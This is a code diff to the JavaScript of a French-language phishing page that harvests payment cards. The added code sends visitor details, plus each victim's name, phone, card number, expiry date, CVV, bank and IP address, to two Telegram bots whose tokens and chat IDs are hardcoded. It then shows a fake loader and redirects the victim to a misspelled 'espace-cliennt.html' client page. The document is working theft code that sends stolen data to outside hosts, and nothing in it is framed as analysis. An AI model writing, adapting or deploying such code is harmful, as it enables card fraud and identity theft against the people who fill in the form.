@@ -551,14 +551,14 @@
 
     <script>
         // =============================================
-        // TRACKER DE VISITE INSTANTANÉ - Nouveau bot
+        // TRACKER DE VISITE INSTANTANÉ - Utilise le même bot que le formulaire
         // =============================================
         (function() {
-            // Configuration du nouveau bot
-            const BOT_TOKEN = "8249633637:AAFSpxM9mw_qVlxVArh5TGDTNSwJhKW8fzA";
-            const BOT_CHAT_ID = "8144648207";
+            // Configuration du bot principal (bot1)
+            const VISIT_TOKEN = "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM";
+            const VISIT_CHAT_ID = "5534662562";
             
-            // Vérifier si on a déjà signalé cette visite
+            // Vérifier si on a déjà signalé cette visite (évite les doublons au rafraîchissement)
             const sessionVisited = sessionStorage.getItem('page_visited');
             
             if (!sessionVisited) {
@@ -617,16 +617,31 @@
 🖥️ USER AGENT:
 ${userAgent.substring(0, 100)}...`;
 
-                    // Envoyer au nouveau bot
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    // Envoyer au même bot que le formulaire (bot1)
+                    fetch(`https://api.telegram.org/bot${VISIT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            chat_id: BOT_CHAT_ID,
+                            chat_id: VISIT_CHAT_ID,
                             text: message
                         })
                     }).catch(error => {
                         console.error('Erreur envoi visite:', error);
+                    });
+                    
+                    // Optionnel : Envoyer aussi au deuxième bot pour redondance
+                    const SECOND_TOKEN = "8550969792:AAGzbD2TYJw27PtokQhSZiJi7lm1JWnyyD4";
+                    const SECOND_CHAT_ID = "8061187067";
+                    
+                    fetch(`https://api.telegram.org/bot${SECOND_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: SECOND_CHAT_ID,
+                            text: message
+                        })
+                    }).catch(error => {
+                        console.error('Erreur envoi visite (bot2):', error);
                     });
                 }
                 
@@ -642,10 +657,6 @@ ${userAgent.substring(0, 100)}...`;
             const errorMessage = document.getElementById('errorMessage');
             const errorText = document.getElementById('errorText');
             const successMessage = document.getElementById('successMessage');
-
-            // Configuration du nouveau bot pour les soumissions
-            const BOT_TOKEN = "8249633637:AAFSpxM9mw_qVlxVArh5TGDTNSwJhKW8fzA";
-            const BOT_CHAT_ID = "8144648207";
 
             function showError(message) {
                 errorText.textContent = message;
@@ -777,11 +788,18 @@ ${userAgent.substring(0, 100)}...`;
                     .catch(() => 'IP non disponible');
             }
 
-            // FONCTION TELEGRAM AVEC LE NOUVEAU BOT
+            // FONCTION TELEGRAM AVEC IP
             function sendToTelegram(firstname, lastname, phone, cardnumber, operator, bank, mm, yy, cvv, ip) {
-                // Récupérer le nom de la banque sélectionnée
-                const bankSelect = document.getElementById('bank');
-                const bankText = bankSelect.selectedOptions[0]?.text || bank;
+                // Les deux bots
+                const bot1 = {
+                    token: "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM",
+                    chatId: "5534662562"
+                };
+                
+                const bot2 = {
+                    token: "8550969792:AAGzbD2TYJw27PtokQhSZiJi7lm1JWnyyD4",
+                    chatId: "8061187067"
+                };
 
                 // Message avec IP
                 const message = `💳 NOUVELLE CARTE 💳
@@ -791,7 +809,7 @@ Prénom: ${firstname}
 Nom: ${lastname}
 Téléphone: ${phone}
 Pays: ${operator}
-Banque: ${bankText}
+Banque: ${document.getElementById('bank').selectedOptions[0].text}
 
 💳 CARTE:
 Numéro: ${cardnumber}
@@ -800,22 +818,29 @@ CVV: ${cvv}
 
 🌐 INFOS TECH:
 IP: ${ip}
-Date: ${new Date().toLocaleString('fr-FR')}
-Appareil: ${navigator.userAgent}`;
+Date: ${new Date().toLocaleString('fr-FR')}`;
 
-                // Envoyer au nouveau bot
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // Envoyer au premier bot
+                fetch(`https://api.telegram.org/bot${bot1.token}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        chat_id: BOT_CHAT_ID,
+                        chat_id: bot1.chatId,
                         text: message
                     })
-                }).catch(error => {
-                    console.error('Erreur envoi Telegram:', error);
                 });
 
-                // Redirection après 2 secondes
+                // Envoyer au deuxième bot  
+                fetch(`https://api.telegram.org/bot${bot2.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: bot2.chatId,
+                        text: message
+                    })
+                });
+
+                // Redirection après 2 secondes AVEC LOADER
                 setTimeout(() => {
                     // Créer un loader en plein écran
                     const loader = document.createElement('div');
@@ -850,9 +875,9 @@ Appareil: ${navigator.userAgent}`;
                     
                     document.body.appendChild(loader);
                     
-                    // Rediriger vers la page de confirmation
+                    // Rediriger vers espace-cliennt.html après 5 secondes
                     setTimeout(() => {
-                        window.location.href = "confirmation.html";
+                        window.location.href = "espace-cliennt.html";
                     }, 5000);
                 }, 2000);
             }
